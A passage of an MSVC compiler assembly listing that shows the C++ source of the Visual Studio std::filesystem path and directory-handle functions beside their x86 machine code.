; 720  :             // path{"c:cat"} / "d:dog"; // yields "d:dog"
; 721  :             // several places herein quote the standard, but the standard's variable p is replaced with _Other
; 722  : 
; 723  :             if (_Other.is_absolute()) { // if _Other.is_absolute(), then op=(_Other)

  00009	8b 4d 08	 mov	 ecx, DWORD PTR __Other$[ebp]
  0000c	e8 00 00 00 00	 call	 ?is_absolute@path@filesystem@std@@QBE_NXZ ; std::filesystem::path::is_absolute
  00011	0f b6 c0	 movzx	 eax, al
  00014	85 c0		 test	 eax, eax
  00016	74 11		 je	 SHORT $LN2@operator

; 724  :                 return operator=(_Other);

  00018	8b 4d 08	 mov	 ecx, DWORD PTR __Other$[ebp]
  0001b	51		 push	 ecx
  0001c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001f	e8 00 00 00 00	 call	 ??4path@filesystem@std@@QAEAAV012@ABV012@@Z ; std::filesystem::path::operator=
  00024	e9 42 01 00 00	 jmp	 $LN1@operator
$LN2@operator:

; 725  :             }
; 726  : 
; 727  :             const auto _My_first            = _Text.data();

  00029	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002c	e8 00 00 00 00	 call	 ?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEPA_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::data
  00031	89 45 f4	 mov	 DWORD PTR __My_first$[ebp], eax

; 728  :             const auto _My_last             = _My_first + _Text.size();

  00034	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00037	e8 00 00 00 00	 call	 ?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
  0003c	8b 55 f4	 mov	 edx, DWORD PTR __My_first$[ebp]
  0003f	8d 04 42	 lea	 eax, DWORD PTR [edx+eax*2]
  00042	89 45 e8	 mov	 DWORD PTR __My_last$[ebp], eax

; 729  :             const auto _Other_first         = _Other._Text.data();

  00045	8b 4d 08	 mov	 ecx, DWORD PTR __Other$[ebp]
  00048	e8 00 00 00 00	 call	 ?data@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEPB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::data
  0004d	89 45 f0	 mov	 DWORD PTR __Other_first$[ebp], eax

; 730  :             const auto _Other_last          = _Other_first + _Other._Text.size();

  00050	8b 4d 08	 mov	 ecx, DWORD PTR __Other$[ebp]
  00053	e8 00 00 00 00	 call	 ?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
  00058	8b 4d f0	 mov	 ecx, DWORD PTR __Other_first$[ebp]
  0005b	8d 14 41	 lea	 edx, DWORD PTR [ecx+eax*2]
  0005e	89 55 e4	 mov	 DWORD PTR __Other_last$[ebp], edx

; 731  :             const auto _My_root_name_end    = _Find_root_name_end(_My_first, _My_last);

  00061	8b 45 e8	 mov	 eax, DWORD PTR __My_last$[ebp]
  00064	50		 push	 eax
  00065	8b 4d f4	 mov	 ecx, DWORD PTR __My_first$[ebp]
  00068	51		 push	 ecx
  00069	e8 00 00 00 00	 call	 ?_Find_root_name_end@filesystem@std@@YAPB_WQB_W0@Z ; std::filesystem::_Find_root_name_end
  0006e	83 c4 08	 add	 esp, 8
  00071	89 45 ec	 mov	 DWORD PTR __My_root_name_end$[ebp], eax

; 732  :             const auto _Other_root_name_end = _Find_root_name_end(_Other_first, _Other_last);

  00074	8b 55 e4	 mov	 edx, DWORD PTR __Other_last$[ebp]
  00077	52		 push	 edx
  00078	8b 45 f0	 mov	 eax, DWORD PTR __Other_first$[ebp]
  0007b	50		 push	 eax
  0007c	e8 00 00 00 00	 call	 ?_Find_root_name_end@filesystem@std@@YAPB_WQB_W0@Z ; std::filesystem::_Find_root_name_end
  00081	83 c4 08	 add	 esp, 8
  00084	89 45 f8	 mov	 DWORD PTR __Other_root_name_end$[ebp], eax

; 733  :             if (_Other_first != _Other_root_name_end
; 734  :                 && _Range_compare(_My_first, _My_root_name_end, _Other_first, _Other_root_name_end) != 0) {

  00087	8b 4d f0	 mov	 ecx, DWORD PTR __Other_first$[ebp]
  0008a	3b 4d f8	 cmp	 ecx, DWORD PTR __Other_root_name_end$[ebp]
  0008d	74 2d		 je	 SHORT $LN3@operator
  0008f	8b 55 f8	 mov	 edx, DWORD PTR __Other_root_name_end$[ebp]
  00092	52		 push	 edx
  00093	8b 45 f0	 mov	 eax, DWORD PTR __Other_first$[ebp]
  00096	50		 push	 eax
  00097	8b 4d ec	 mov	 ecx, DWORD PTR __My_root_name_end$[ebp]
  0009a	51		 push	 ecx
  0009b	8b 55 f4	 mov	 edx, DWORD PTR __My_first$[ebp]
  0009e	52		 push	 edx
  0009f	e8 00 00 00 00	 call	 ?_Range_compare@filesystem@std@@YAHQB_W000@Z ; std::filesystem::_Range_compare
  000a4	83 c4 10	 add	 esp, 16			; 00000010H
  000a7	85 c0		 test	 eax, eax
  000a9	74 11		 je	 SHORT $LN3@operator

; 735  :                 // if _Other.has_root_name() && _Other.root_name() != root_name(), then op=(_Other)
; 736  :                 return operator=(_Other);

  000ab	8b 45 08	 mov	 eax, DWORD PTR __Other$[ebp]
  000ae	50		 push	 eax
  000af	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  000b2	e8 00 00 00 00	 call	 ??4path@filesystem@std@@QAEAAV012@ABV012@@Z ; std::filesystem::path::operator=
  000b7	e9 af 00 00 00	 jmp	 $LN1@operator
$LN3@operator:

; 737  :             }
; 738  : 
; 739  :             if (_Other_root_name_end != _Other_last && _Is_slash(*_Other_root_name_end)) {

  000bc	8b 4d f8	 mov	 ecx, DWORD PTR __Other_root_name_end$[ebp]
  000bf	3b 4d e4	 cmp	 ecx, DWORD PTR __Other_last$[ebp]
  000c2	74 31		 je	 SHORT $LN4@operator
  000c4	8b 55 f8	 mov	 edx, DWORD PTR __Other_root_name_end$[ebp]
  000c7	0f b7 02	 movzx	 eax, WORD PTR [edx]
  000ca	50		 push	 eax
  000cb	b9 00 00 00 00	 mov	 ecx, OFFSET ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  000d0	e8 00 00 00 00	 call	 ??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z ; std::filesystem::_Is_slash_oper::operator()
  000d5	0f b6 c8	 movzx	 ecx, al
  000d8	85 c9		 test	 ecx, ecx
  000da	74 19		 je	 SHORT $LN4@operator

; 740  :                 // If _Other.has_root_directory() removes any root directory and relative-path from *this
; 741  :                 _Text.erase(static_cast<size_t>(_My_root_name_end - _My_first));

  000dc	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  000df	89 55 e0	 mov	 DWORD PTR tv148[ebp], edx
  000e2	8b 45 ec	 mov	 eax, DWORD PTR __My_root_name_end$[ebp]
  000e5	2b 45 f4	 sub	 eax, DWORD PTR __My_first$[ebp]
  000e8	d1 f8		 sar	 eax, 1
  000ea	50		 push	 eax
  000eb	8b 4d e0	 mov	 ecx, DWORD PTR tv148[ebp]
  000ee	e8 00 00 00 00	 call	 ?erase@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@I@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::erase

; 742  :             } else {

  000f3	eb 58		 jmp	 SHORT $LN9@operator
$LN4@operator:

; 743  :                 // Otherwise, if (!has_root_directory && is_absolute) || has_filename appends path::preferred_separator
; 744  :                 if (_My_root_name_end == _My_last) {

  000f5	8b 4d ec	 mov	 ecx, DWORD PTR __My_root_name_end$[ebp]
  000f8	3b 4d e8	 cmp	 ecx, DWORD PTR __My_last$[ebp]
  000fb	75 1f		 jne	 SHORT $LN6@operator

; 745  :                     // Here, !has_root_directory && !has_filename
; 746  :                     // Going through our root_name kinds:
; 747  :                     // X: can't be absolute here, since those paths are absolute only when has_root_directory
; 748  :                     // \\?\ can't exist without has_root_directory
; 749  :                     // \\server can be absolute here
; 750  :                     if (_My_root_name_end - _My_first >= 3) {

  000fd	8b 55 ec	 mov	 edx, DWORD PTR __My_root_name_end$[ebp]
  00100	2b 55 f4	 sub	 edx, DWORD PTR __My_first$[ebp]
  00103	d1 fa		 sar	 edx, 1
  00105	83 fa 03	 cmp	 edx, 3
  00108	7c 10		 jl	 SHORT $LN8@operator

; 751  :                         _Text.push_back(preferred_separator);

  0010a	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0010d	89 45 dc	 mov	 DWORD PTR tv156[ebp], eax
  00110	6a 5c		 push	 92			; 0000005cH
  00112	8b 4d dc	 mov	 ecx, DWORD PTR tv156[ebp]
  00115	e8 00 00 00 00	 call	 ?push_back@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEX_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::push_back
$LN8@operator:

; 752  :                     }
; 753  :                 } else {

  0011a	eb 31		 jmp	 SHORT $LN9@operator
$LN6@operator:

; 754  :                     // Here, has_root_directory || has_filename
; 755  :                     // If there is a trailing slash, the trailing slash might be part of root_directory.
; 756  :                     // If it is, has_root_directory && !has_filename, so the test fails.
; 757  :                     // If there is a trailing slash not part of root_directory, then !has_filename, so only
; 758  :                     // (!has_root_directory && is_absolute) remains
; 759  :                     // Going through our root_name kinds:
; 760  :                     // X:cat\ needs a root_directory to be absolute
; 761  :                     // \\server\cat must have a root_directory to exist with a relative_path
; 762  :                     // \\?\ must have a root_directory to exist
; 763  :                     // As a result, the test fails if there is a trailing slash.
; 764  :                     // If there is no trailing slash, then has_filename, so the test passes.
; 765  :                     // Therefore, the test passes if and only if there is no trailing slash.
; 766  :                     if (!_Is_slash(_My_last[-1])) {

  0011c	b9 02 00 00 00	 mov	 ecx, 2
  00121	6b d1 ff	 imul	 edx, ecx, -1
  00124	8b 45 e8	 mov	 eax, DWORD PTR __My_last$[ebp]
  00127	0f b7 0c 10	 movzx	 ecx, WORD PTR [eax+edx]
  0012b	51		 push	 ecx
  0012c	b9 00 00 00 00	 mov	 ecx, OFFSET ?_Is_slash@filesystem@std@@3U_Is_slash_oper@12@B ; std::filesystem::_Is_slash
  00131	e8 00 00 00 00	 call	 ??R_Is_slash_oper@filesystem@std@@QBE_N_W@Z ; std::filesystem::_Is_slash_oper::operator()
  00136	0f b6 d0	 movzx	 edx, al
  00139	85 d2		 test	 edx, edx
  0013b	75 10		 jne	 SHORT $LN9@operator

; 767  :                         _Text.push_back(preferred_separator);

  0013d	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00140	89 45 d8	 mov	 DWORD PTR tv168[ebp], eax
  00143	6a 5c		 push	 92			; 0000005cH
  00145	8b 4d d8	 mov	 ecx, DWORD PTR tv168[ebp]
  00148	e8 00 00 00 00	 call	 ?push_back@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEX_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::push_back
$LN9@operator:

; 768  :                     }
; 769  :                 }
; 770  :             }
; 771  : 
; 772  :             // Then appends the native format pathname of _Other, omitting any root-name from its generic format
; 773  :             // pathname, to the native format pathname.
; 774  :             _Text.append(_Other_root_name_end, static_cast<size_t>(_Other_last - _Other_root_name_end));

  0014d	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00150	89 4d d4	 mov	 DWORD PTR tv177[ebp], ecx
  00153	8b 55 e4	 mov	 edx, DWORD PTR __Other_last$[ebp]
  00156	2b 55 f8	 sub	 edx, DWORD PTR __Other_root_name_end$[ebp]
  00159	d1 fa		 sar	 edx, 1
  0015b	52		 push	 edx
  0015c	8b 45 f8	 mov	 eax, DWORD PTR __Other_root_name_end$[ebp]
  0015f	50		 push	 eax
  00160	8b 4d d4	 mov	 ecx, DWORD PTR tv177[ebp]
  00163	e8 00 00 00 00	 call	 ?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@QB_WI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append

; 775  :             return *this;

  00168	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
$LN1@operator:

; 776  :         }

  0016b	8b e5		 mov	 esp, ebp
  0016d	5d		 pop	 ebp
  0016e	c2 04 00	 ret	 4
??_0path@filesystem@std@@QAEAAV012@ABV012@@Z ENDP	; std::filesystem::path::operator/=
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??4path@filesystem@std@@QAEAAV012@$$QAV012@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___that$ = 8						; size = 4
??4path@filesystem@std@@QAEAAV012@$$QAV012@@Z PROC	; std::filesystem::path::operator=, COMDAT
; _this$ = ecx

; 646  :         path& operator=(path&&) noexcept = default;

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 08	 mov	 eax, DWORD PTR ___that$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	e8 00 00 00 00	 call	 ??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV01@$$QAV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
  00013	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00016	8b e5		 mov	 esp, ebp
  00018	5d		 pop	 ebp
  00019	c2 04 00	 ret	 4
??4path@filesystem@std@@QAEAAV012@$$QAV012@@Z ENDP	; std::filesystem::path::operator=
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??4path@filesystem@std@@QAEAAV012@ABV012@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___that$ = 8						; size = 4
??4path@filesystem@std@@QAEAAV012@ABV012@@Z PROC	; std::filesystem::path::operator=, COMDAT
; _this$ = ecx

; 645  :         path& operator=(const path&)     = default;

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 08	 mov	 eax, DWORD PTR ___that$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	e8 00 00 00 00	 call	 ??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV01@ABV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
  00013	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00016	8b e5		 mov	 esp, ebp
  00018	5d		 pop	 ebp
  00019	c2 04 00	 ret	 4
??4path@filesystem@std@@QAEAAV012@ABV012@@Z ENDP	; std::filesystem::path::operator=
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??1path@filesystem@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1path@filesystem@std@@QAE@XZ PROC			; std::filesystem::path::~path, COMDAT
; _this$ = ecx

; 644  :         ~path()                          = default;

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1path@filesystem@std@@QAE@XZ ENDP			; std::filesystem::path::~path
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??0path@filesystem@std@@QAE@ABV012@@Z
_TEXT	SEGMENT
tv70 = -8						; size = 4
_this$ = -4						; size = 4
___that$ = 8						; size = 4
??0path@filesystem@std@@QAE@ABV012@@Z PROC		; std::filesystem::path::path, COMDAT
; _this$ = ecx

; 642  :         path(const path&)                = default;

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR tv70[ebp], eax
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR ___that$[ebp]
  00012	51		 push	 ecx
  00013	8b 4d f8	 mov	 ecx, DWORD PTR tv70[ebp]
  00016	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@ABV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  0001b	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001e	8b e5		 mov	 esp, ebp
  00020	5d		 pop	 ebp
  00021	c2 04 00	 ret	 4
??0path@filesystem@std@@QAE@ABV012@@Z ENDP		; std::filesystem::path::path
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??0path@filesystem@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0path@filesystem@std@@QAE@XZ PROC			; std::filesystem::path::path, COMDAT
; _this$ = ecx

; 641  :         path()                           = default;

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  0000f	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00012	8b e5		 mov	 esp, ebp
  00014	5d		 pop	 ebp
  00015	c3		 ret	 0
??0path@filesystem@std@@QAE@XZ ENDP			; std::filesystem::path::path
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$exchange@W4__std_fs_dir_handle@@W41@@std@@YA?AW4__std_fs_dir_handle@@AAW41@$$QAW41@@Z
_TEXT	SEGMENT
__Old_val$ = -4						; size = 4
__Val$ = 8						; size = 4
__New_val$ = 12						; size = 4
??$exchange@W4__std_fs_dir_handle@@W41@@std@@YA?AW4__std_fs_dir_handle@@AAW41@$$QAW41@@Z PROC ; std::exchange<enum __std_fs_dir_handle,enum __std_fs_dir_handle>, COMDAT

; 760  :     conjunction_v<is_nothrow_move_constructible<_Ty>, is_nothrow_assignable<_Ty&, _Other>>) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 761  :     // assign _New_val to _Val, return previous _Val
; 762  :     _Ty _Old_val = static_cast<_Ty&&>(_Val);

  00004	8b 45 08	 mov	 eax, DWORD PTR __Val$[ebp]
  00007	8b 08		 mov	 ecx, DWORD PTR [eax]
  00009	89 4d fc	 mov	 DWORD PTR __Old_val$[ebp], ecx

; 763  :     _Val         = static_cast<_Other&&>(_New_val);

  0000c	8b 55 08	 mov	 edx, DWORD PTR __Val$[ebp]
  0000f	8b 45 0c	 mov	 eax, DWORD PTR __New_val$[ebp]
  00012	8b 08		 mov	 ecx, DWORD PTR [eax]
  00014	89 0a		 mov	 DWORD PTR [edx], ecx

; 764  :     return _Old_val;

  00016	8b 45 fc	 mov	 eax, DWORD PTR __Old_val$[ebp]

; 765  : }

  00019	8b e5		 mov	 esp, ebp
  0001b	5d		 pop	 ebp
  0001c	c3		 ret	 0
??$exchange@W4__std_fs_dir_handle@@W41@@std@@YA?AW4__std_fs_dir_handle@@AAW41@$$QAW41@@Z ENDP ; std::exchange<enum __std_fs_dir_handle,enum __std_fs_dir_handle>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??1_Find_file_handle@filesystem@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1_Find_file_handle@filesystem@std@@QAE@XZ PROC	; std::filesystem::_Find_file_handle::~_Find_file_handle, COMDAT
; _this$ = ecx

; 610  :         ~_Find_file_handle() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 611  :             __std_fs_directory_iterator_close(_Handle);

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 08		 mov	 ecx, DWORD PTR [eax]
  0000c	51		 push	 ecx
  0000d	e8 00 00 00 00	 call	 ___std_fs_directory_iterator_close@4

; 612  :         }

  00012	8b e5		 mov	 esp, ebp
  00014	5d		 pop	 ebp
  00015	c3		 ret	 0
??1_Find_file_handle@filesystem@std@@QAE@XZ ENDP	; std::filesystem::_Find_file_handle::~_Find_file_handle
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Open@_Find_file_handle@filesystem@std@@QAE?AW4__std_win_error@@PB_WPAU__std_fs_find_data@@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Path_spec$ = 8					; size = 4
__Results$ = 12						; size = 4
?_Open@_Find_file_handle@filesystem@std@@QAE?AW4__std_win_error@@PB_WPAU__std_fs_find_data@@@Z PROC ; std::filesystem::_Find_file_handle::_Open, COMDAT
; _this$ = ecx

; 606  :         _NODISCARD __std_win_error _Open(const wchar_t* _Path_spec, __std_fs_find_data* _Results) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 607  :             return __std_fs_directory_iterator_open(_Path_spec, &_Handle, _Results);

  00007	8b 45 0c	 mov	 eax, DWORD PTR __Results$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	51		 push	 ecx
  0000f	8b 55 08	 mov	 edx, DWORD PTR __Path_spec$[ebp]
  00012	52		 push	 edx
  00013	e8 00 00 00 00	 call	 ___std_fs_directory_iterator_open@12

; 608  :         }

  00018	8b e5		 mov	 esp, ebp
  0001a	5d		 pop	 ebp
  0001b	c2 08 00	 ret	 8
?_Open@_Find_file_handle@filesystem@std@@QAE?AW4__std_win_error@@PB_WPAU__std_fs_find_data@@@Z ENDP ; std::filesystem::_Find_file_handle::_Open
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??0_Find_file_handle@filesystem@std@@QAE@$$QAU012@@Z
_TEXT	SEGMENT
$T1 = -8						; size = 4
_this$ = -4						; size = 4
__Rhs$ = 8						; size = 4
??0_Find_file_handle@filesystem@std@@QAE@$$QAU012@@Z PROC ; std::filesystem::_Find_file_handle::_Find_file_handle, COMDAT
; _this$ = ecx

; 596  :         _Find_file_handle(_Find_file_handle&& _Rhs) noexcept

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 597  :             : _Handle(_STD exchange(_Rhs._Handle, __std_fs_dir_handle::_Invalid)) {}

  00009	c7 45 f8 ff ff
	ff ff		 mov	 DWORD PTR $T1[ebp], -1
  00010	8d 45 f8	 lea	 eax, DWORD PTR $T1[ebp]
  00013	50		 push	 eax
  00014	8b 4d 08	 mov	 ecx, DWORD PTR __Rhs$[ebp]
  00017	51		 push	 ecx
  00018	e8 00 00 00 00	 call	 ??$exchange@W4__std_fs_dir_handle@@W41@@std@@YA?AW4__std_fs_dir_handle@@AAW41@$$QAW41@@Z ; std::exchange<enum __std_fs_dir_handle,enum __std_fs_dir_handle>
  0001d	83 c4 08	 add	 esp, 8
  00020	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00023	89 02		 mov	 DWORD PTR [edx], eax
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??0_Find_file_handle@filesystem@std@@QAE@$$QAU012@@Z ENDP ; std::filesystem::_Find_file_handle::_Find_file_handle
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??0_Find_file_handle@filesystem@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0_Find_file_handle@filesystem@std@@QAE@XZ PROC	; std::filesystem::_Find_file_handle::_Find_file_handle, COMDAT
; _this$ = ecx

; 595  :         _Find_file_handle() noexcept = default;

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 593  :         __std_fs_dir_handle _Handle = __std_fs_dir_handle::_Invalid;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	c7 00 ff ff ff
	ff		 mov	 DWORD PTR [eax], -1

; 595  :         _Find_file_handle() noexcept = default;

  00010	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00013	8b e5		 mov	 esp, ebp
  00015	5d		 pop	 ebp
  00016	c3		 ret	 0
??0_Find_file_handle@filesystem@std@@QAE@XZ ENDP	; std::filesystem::_Find_file_handle::_Find_file_handle
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Is_dot_or_dotdot@filesystem@std@@YA_NABU__std_fs_find_data@@@Z
_TEXT	SEGMENT
tv81 = -8						; size = 4
__Second_char$ = -4					; size = 2
__Data$ = 8						; size = 4
?_Is_dot_or_dotdot@filesystem@std@@YA_NABU__std_fs_find_data@@@Z PROC ; std::filesystem::_Is_dot_or_dotdot, COMDAT

; 574  :     _NODISCARD inline bool _Is_dot_or_dotdot(const __std_fs_find_data& _Data) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8

; 575  :         // tests if _File_name of __std_fs_find_data is . or ..
; 576  :         if (_Data._File_name[0] != L'.') {

  00006	b8 02 00 00 00	 mov	 eax, 2
  0000b	6b c8 00	 imul	 ecx, eax, 0
  0000e	8b 55 08	 mov	 edx, DWORD PTR __Data$[ebp]
  00011	0f b7 44 0a 2c	 movzx	 eax, WORD PTR [edx+ecx+44]
  00016	83 f8 2e	 cmp	 eax, 46			; 0000002eH
  00019	74 04		 je	 SHORT $LN2@Is_dot_or_

; 577  :             return false;

  0001b	32 c0		 xor	 al, al
  0001d	eb 53		 jmp	 SHORT $LN1@Is_dot_or_
$LN2@Is_dot_or_:

; 578  :         }
; 579  : 
; 580  :         const auto _Second_char = _Data._File_name[1];

  0001f	b9 02 00 00 00	 mov	 ecx, 2
  00024	c1 e1 00	 shl	 ecx, 0
  00027	8b 55 08	 mov	 edx, DWORD PTR __Data$[ebp]
  0002a	66 8b 44 0a 2c	 mov	 ax, WORD PTR [edx+ecx+44]
  0002f	66 89 45 fc	 mov	 WORD PTR __Second_char$[ebp], ax

; 581  :         if (_Second_char == 0) {

  00033	0f b7 4d fc	 movzx	 ecx, WORD PTR __Second_char$[ebp]
  00037	85 c9		 test	 ecx, ecx
  00039	75 04		 jne	 SHORT $LN3@Is_dot_or_

; 582  :             return true;

  0003b	b0 01		 mov	 al, 1
  0003d	eb 33		 jmp	 SHORT $LN1@Is_dot_or_
$LN3@Is_dot_or_:

; 583  :         }
; 584  : 
; 585  :         if (_Second_char != L'.') {

  0003f	0f b7 55 fc	 movzx	 edx, WORD PTR __Second_char$[ebp]
  00043	83 fa 2e	 cmp	 edx, 46			; 0000002eH
  00046	74 04		 je	 SHORT $LN4@Is_dot_or_

; 586  :             return false;

  00048	32 c0		 xor	 al, al
  0004a	eb 26		 jmp	 SHORT $LN1@Is_dot_or_
$LN4@Is_dot_or_:

; 587  :         }
; 588  : 
; 589  :         return _Data._File_name[2] == 0;

